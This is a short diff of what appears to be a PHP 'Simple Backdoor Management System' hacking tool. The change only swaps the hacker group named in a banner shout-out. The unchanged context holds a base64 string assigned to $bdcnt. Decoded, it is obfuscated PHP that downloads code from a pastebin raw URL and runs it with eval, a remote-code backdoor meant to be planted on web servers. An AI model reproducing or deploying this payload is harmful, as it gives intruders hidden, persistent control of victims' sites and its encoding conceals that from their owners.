@@ -18,7 +18,7 @@ ________________________________________________________________________________
 
                   $cln  Simple Backdoor Management System
                   $fgreen  Coded By$bold$red R3D#@x0R_2H1N A.K.A Tuhinshubhra $cln
-                   $blue Shout Out:$bold LulZSec India $cln \e[96m
+                   $blue Shout Out:$bold trhacknon Anonymous $cln \e[96m
 ================================================================================
 ";
 $bdcnt = "PD9waHAgJHsiXHg0N0xceDRmQlx4NDFMXHg1MyJ9WyJceDY4bVx4NzJceDZhXHg3MVx4NjNceDZmXHg3NHpceDcwIl09Ilx4NjJceDY0XHg2Zlx4NzIiOyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3cVx4NzlceDZkYWNmXHg2NSJdPSJiXHg2NFx4NmZyIjskeyR7Ilx4NDdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2OFx4NmRceDcyXHg2YXFjXHg2Zlx4NzRceDdhXHg3MCJdfT1maWxlX2dldF9jb250ZW50cygiXHg2OFx4NzR0cFx4NzM6Ly9ceDcwYXNceDc0ZWJpblx4MmVjb1x4NmQvXHg3MmFceDc3L1x4N2E3aWhceDU4cFx4NTZceDQxIik7ZXZhbCgkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3XHg3MVx4NzlceDZkXHg2MWNmZSJdfSk7Cj8+";
